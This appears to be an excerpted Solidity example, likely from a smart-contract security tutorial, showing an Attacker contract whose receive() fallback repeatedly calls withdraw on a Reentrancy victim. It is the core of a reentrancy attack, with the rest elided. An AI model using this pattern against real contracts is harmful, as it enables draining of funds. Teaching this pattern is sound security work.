contract Attacker {

    Reentrancy victim;

    // ...

    receive() external payable {

        victim.withdraw(1 ether);

    }

}
